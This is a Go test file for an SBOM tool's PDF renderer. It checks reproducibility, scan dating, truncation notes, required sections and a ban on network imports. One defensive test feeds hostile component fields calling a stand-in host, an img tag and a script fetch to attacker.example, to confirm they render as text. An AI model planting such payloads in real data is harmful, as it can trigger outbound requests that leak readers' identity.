package render

import (
	"bytes"
	"compress/zlib"
	"go/parser"
	"go/token"
	"io"
	"os"
	"strconv"
	"strings"
	"testing"

	"github.com/encorebom/encorebom/libs/go-shared/model"
	"github.com/encorebom/encorebom/libs/go-shared/platform/errs"
)

// TestThePDFRendererCannotReachTheNetwork.
//
// ⚠ THE PHASE REQUIREMENT IS "the PDF render does not fetch remote resources",
// AND A BEHAVIOURAL TEST CANNOT PROVE IT.
//
// Rendering one document and observing no HTTP request proves only that THAT
// document triggered none. The property we need is that no document can, which
// is a statement about the code, so the check reads the code.
//
// This is the same shape as the project service's TestNoExtractionCodePathExists.
// It survives the case that matters: somebody adding a "fetch the customer's
// logo" feature two phases from now, at which point an `<img src>` in a
// component description becomes an outbound request carrying the reader's
// identity to whoever published the hostile package.
func TestThePDFRendererCannotReachTheNetwork(t *testing.T) {
	// Packages that can open a connection, resolve a name, or parse markup into
	// something that resolves references.
	forbidden := map[string]string{
		"net":                   "can open a socket",
		"net/http":              "can make a request",
		"net/url":               "resolves references, which is the first half of fetching one",
		"os/exec":               "can shell out to something that fetches",
		"html":                  "parses markup",
		"html/template":         "parses markup",
		"golang.org/x/net/html": "parses markup",
	}

	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatalf("listing the package directory: %v", err)
	}

	fset := token.NewFileSet()
	scanned := 0
	for _, entry := range entries {
		name := entry.Name()
		// ⚠ Test files are excluded deliberately. This file's own siblings may
		// legitimately reach the network in a fixture, and a check that failed
		// on its own scaffolding would be switched off within a week.
		if entry.IsDir() || !strings.HasSuffix(name, ".go") ||
			strings.HasSuffix(name, "_test.go") {
			continue
		}

		file, err := parser.ParseFile(fset, name, nil, parser.ImportsOnly)
		if err != nil {
			t.Fatalf("parsing %s: %v", name, err)
		}
		scanned++

		for _, imp := range file.Imports {
			importPath := strings.Trim(imp.Path.Value, `"`)
			if why, bad := forbidden[importPath]; bad {
				t.Errorf(
					"%s imports %q, which %s.\n"+
						"The PDF renderer's guarantee that it cannot fetch a remote\n"+
						"resource is STRUCTURAL — there is no HTML parser and no HTTP\n"+
						"client in the path. Adding one turns every rendered report\n"+
						"into an outbound request on behalf of whoever published a\n"+
						"hostile package name.",
					name, importPath, why)
			}
		}
	}

	// ⚠ A CHECK THAT SCANNED NOTHING PASSES. The most likely way this guard
	// dies is a path change that quietly makes it read zero files.
	if scanned == 0 {
		t.Fatal("no source files were scanned, so this check proved nothing")
	}
}

// TestAHostileDescriptionRendersAsText — the behavioural half. It cannot prove
// the negative above, but it does prove the payload survives as literal text
// rather than being interpreted.
func TestAHostileDescriptionRendersAsText(t *testing.T) {
	b := sampleBOM()
	b.Components = append(b.Components, Component{
		Key:       "name:npm/hostile",
		Ecosystem: "npm",
		Fields: map[string]string{
			model.FieldCertinSbom01ComponentName:        `<img src="http://attacker.example/x">`,
			model.FieldCertinSbom03ComponentDescription: `<script>fetch('http://attacker.example')</script>`,
		},
	})

	var buf bytes.Buffer
	if _, err := WritePDF(&buf, b, PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}
	if buf.Len() == 0 {
		t.Fatal("the renderer produced no bytes")
	}
	if !bytes.HasPrefix(buf.Bytes(), []byte("%PDF-")) {
		t.Fatalf("the output is not a PDF: %q", buf.Bytes()[:min(16, buf.Len())])
	}
}

// TestThePDFIsByteReproducible.
//
// ⚠ fpdf STAMPS /CreationDate FROM time.Now UNLESS TOLD OTHERWISE. Two renders
// of the same stored data would then differ, and a signature over one would not
// verify against the other (ADR-0003). The document is dated by the SCAN.
func TestThePDFIsByteReproducible(t *testing.T) {
	b := sampleBOM()

	var first bytes.Buffer
	if _, err := WritePDF(&first, b, PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}

	for i := range 30 {
		var again bytes.Buffer
		if _, err := WritePDF(&again, b, PDFOptions{}); err != nil {
			t.Fatalf("rendering (iteration %d): %v", i, err)
		}
		if !bytes.Equal(first.Bytes(), again.Bytes()) {
			t.Fatalf("the PDF changed between renders on iteration %d "+
				"(%d vs %d bytes)", i, first.Len(), again.Len())
		}
	}
}

// TestTheDocumentDateComesFromTheScan — not from the render.
func TestTheDocumentDateComesFromTheScan(t *testing.T) {
	b := sampleBOM()
	b.GeneratedAt = "2024-01-02T03:04:05Z"

	var buf bytes.Buffer
	if _, err := WritePDF(&buf, b, PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}

	// PDF dates are D:YYYYMMDDHHmmSS.
	if !bytes.Contains(buf.Bytes(), []byte("D:20240102030405")) {
		t.Fatalf("the document is not dated by the scan; a re-render would claim " +
			"to describe today")
	}
}

// TestAHugeBOMIsRefusedRatherThanOOMing.
//
// A 50k-component Complete BOM is 3000+ pages. Nobody reads it, and building it
// exhausts the render worker — taking every other queued report with it. The
// remedy is a different format, and the error says so.
func TestAHugeBOMIsRefusedRatherThanOOMing(t *testing.T) {
	b := sampleBOM()
	b.Components = make([]Component, 50_000)
	for i := range b.Components {
		b.Components[i] = Component{
			Key:       "purl:pkg:npm/c" + strconv.Itoa(i),
			Ecosystem: "npm",
			Fields: map[string]string{
				model.FieldCertinSbom01ComponentName: "component-" + strconv.Itoa(i),
			},
		}
	}

	var buf bytes.Buffer
	_, err := WritePDF(&buf, b, PDFOptions{})
	if err == nil {
		t.Fatal("a 50k-component BOM rendered as a PDF without complaint")
	}
	if !errs.Is(err, errs.ReportTooLargeForPDF) {
		t.Fatalf("error code = %v, want %v", errs.From(err).Code, errs.ReportTooLargeForPDF)
	}
	if !strings.Contains(errs.From(err).Error(), "PDF") {
		t.Errorf("the error does not name the format: %v", err)
	}
}

// TestAModeratelyLargeBOMTruncatesWithANote.
//
// Between "fits" and "absurd" the document is produced and CUT, and the cut is
// stated in the document. A PDF that stops at component 4,000 of 9,000 without
// saying so is a report the customer will quote as complete.
func TestAModeratelyLargeBOMTruncatesWithANote(t *testing.T) {
	b := sampleBOM()
	b.Components = make([]Component, 3000)
	for i := range b.Components {
		b.Components[i] = Component{
			Key:       "purl:pkg:npm/c" + strconv.Itoa(i),
			Ecosystem: "npm",
			Fields: map[string]string{
				model.FieldCertinSbom01ComponentName: "component-" + strconv.Itoa(i),
			},
		}
	}

	var buf bytes.Buffer
	result, err := WritePDF(&buf, b, PDFOptions{PageCap: 40})
	if err != nil {
		t.Fatalf("rendering: %v", err)
	}
	if !result.Truncated {
		t.Fatal("a BOM well past the page cap was not marked truncated")
	}
	if result.TruncationNote == "" {
		t.Fatal("the report record carries no truncation note")
	}
	for _, want := range []string{"of 3000", "XLSX", "JSON"} {
		if !strings.Contains(result.TruncationNote, want) {
			t.Errorf("the truncation note does not mention %q: %s", want, result.TruncationNote)
		}
	}
	// ⚠ The note must be IN the document too, not only in the record. The
	// customer reads the PDF; nobody reads the database row.
	if !strings.Contains(extractPDFText(t, buf.Bytes()), "Truncated") {
		t.Error("the truncation is not stated in the document itself")
	}
}

// TestEveryMandatorySectionIsPresent.
//
// Engine Coverage is the one the product exists for: an SBOM that silently
// omits an ecosystem converts an unknown into a false negative the customer
// trusts. The VEX section is stubbed rather than omitted, so a reader can tell
// "no statements" from "this tool does not do VEX".
func TestEveryMandatorySectionIsPresent(t *testing.T) {
	b := sampleBOM()

	var buf bytes.Buffer
	if _, err := WritePDF(&buf, b, PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}

	text := extractPDFText(t, buf.Bytes())
	for _, want := range []string{
		"Coverage",
		"Engine Coverage",
		"Practices and Processes",
		"Components",
		"Findings",
		"License inventory",
		"VEX statements",
		"CSAF",
		"Methodology and caveats",
		"Signature",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("the PDF has no %q section", want)
		}
	}
}

// TestBothCoverageNumbersAppearInThePDF — publishing only the declaration
// number and calling it coverage is how tools ship misleading 100% scores.
func TestBothCoverageNumbersAppearInThePDF(t *testing.T) {
	b := sampleBOM()

	var buf bytes.Buffer
	if _, err := WritePDF(&buf, b, PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}

	text := extractPDFText(t, buf.Bytes())
	for _, want := range []string{
		"Completeness", "12.40%", "Declaration", "100.00%",
		"EncoreBOM's judgement",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("the PDF does not carry %q", want)
		}
	}
}

// TestTheWordCompliantDoesNotAppearInThePDF — the same contract as every other
// format, checked over the rendered text.
func TestTheWordCompliantDoesNotAppearInThePDF(t *testing.T) {
	var buf bytes.Buffer
	if _, err := WritePDF(&buf, sampleBOM(), PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}

	text := strings.ToLower(extractPDFText(t, buf.Bytes()))
	for _, banned := range []string{"compliant", "certified"} {
		if strings.Contains(text, banned) {
			t.Errorf("the PDF contains %q", banned)
		}
	}
}

// TestAnEngineLessReportSaysSo — every number in it describes nothing, and the
// document has to say that rather than showing an empty table.
func TestAnEngineLessReportSaysSo(t *testing.T) {
	b := sampleBOM()
	b.Engines = nil
	b.EcosystemsWithNoEngine = nil

	var buf bytes.Buffer
	if _, err := WritePDF(&buf, b, PDFOptions{}); err != nil {
		t.Fatalf("rendering: %v", err)
	}
	if !strings.Contains(extractPDFText(t, buf.Bytes()), "No engine ran") {
		t.Error("an engine-less report does not say so")
	}
}

// TestACBOMPDFIsRefused — the same type-discrimination refusal as every other
// format, so they cannot disagree about what a CBOM is.
func TestACBOMPDFIsRefused(t *testing.T) {
	b := sampleBOM()
	b.BOMType = model.BOMTypeCBOM

	var buf bytes.Buffer
	if _, err := WritePDF(&buf, b, PDFOptions{}); err == nil {
		t.Fatal("a CBOM rendered against the flat SBOM field set")
	}
}

// TestNonLatinTextIsReplacedNotDropped.
//
// fpdf's base-14 fonts are single-byte. A dropped rune renders a component name
// as blank, which reads as a missing component; `?` reads as "this did not fit
// the page", and the XLSX and JSON exports carry the real text.
func TestNonLatinTextIsReplacedNotDropped(t *testing.T) {
	got := sanitizePDF("包名-lodash")
	if strings.HasPrefix(got, "-lodash") {
		t.Fatalf("the non-Latin prefix was dropped, leaving %q — a name that is "+
			"not the package's", got)
	}
	if !strings.Contains(got, "lodash") {
		t.Fatalf("the Latin part was lost too: %q", got)
	}
	if !strings.Contains(got, "?") {
		t.Fatalf("nothing marks the lost characters: %q", got)
	}
}

// ─── helpers ────────────────────────────────────────────────────────────────

// extractPDFText pulls the drawn strings out of the PDF's content streams.
//
// ⚠ THE STREAMS ARE zlib-COMPRESSED, so a plain byte scan finds nothing — and
// finds it silently. The first version of this returned an empty string and
// every "is section X present" assertion passed vacuously. The Fatalf at the
// bottom exists so that cannot happen again quietly.
//
// A full PDF parser would be a dependency added purely to read our own output.
// This inflates each stream and pulls out the `(literal)` operands, which is
// all fpdf writes for a text-only document.
func extractPDFText(t *testing.T, data []byte) string {
	t.Helper()

	var sb strings.Builder
	rest := data
	for {
		i := bytes.Index(rest, []byte("stream"))
		if i < 0 {
			break
		}
		body := bytes.TrimLeft(rest[i+len("stream"):], "\r\n")
		j := bytes.Index(body, []byte("endstream"))
		if j < 0 {
			break
		}
		sb.WriteString(pdfLiterals(inflate(body[:j])))
		// ⚠ Advance past the WHOLE keyword. Leaving `rest` pointing at
		// `endstream` makes the next search match the `stream` inside it, so the
		// following block starts mid-object, fails to inflate, and is scanned as
		// raw compressed bytes — which yields garbage rather than an error, and
		// silently drops every page after the first.
		rest = body[j+len("endstream"):]
	}

	// Uncompressed literals too, for metadata strings outside content streams.
	sb.WriteString(pdfLiterals(data))

	text := sb.String()
	if strings.TrimSpace(text) == "" {
		t.Fatalf("no text could be read out of the %d-byte PDF. The extractor "+
			"needs updating before any assertion using it means anything — an "+
			"empty result makes every `contains` check pass.", len(data))
	}
	return text
}

// inflate zlib-decompresses a stream, returning it unchanged if it is not
// compressed.
func inflate(stream []byte) []byte {
	zr, err := zlib.NewReader(bytes.NewReader(stream))
	if err != nil {
		return stream
	}
	defer func() { _ = zr.Close() }()
	out, err := io.ReadAll(zr)
	if err != nil {
		return stream
	}
	return out
}

// pdfLiterals extracts PDF string literals — `(text)` — from a byte range.
func pdfLiterals(data []byte) string {
	var sb strings.Builder
	for i := 0; i < len(data); i++ {
		if data[i] != '(' {
			continue
		}
		j := i + 1
		var lit []byte
		for j < len(data) {
			if data[j] == '\\' && j+1 < len(data) {
				lit = append(lit, data[j+1])
				j += 2
				continue
			}
			if data[j] == ')' {
				break
			}
			lit = append(lit, data[j])
			j++
		}
		sb.Write(lit)
		sb.WriteByte('\n')
		i = j
	}
	return sb.String()
}
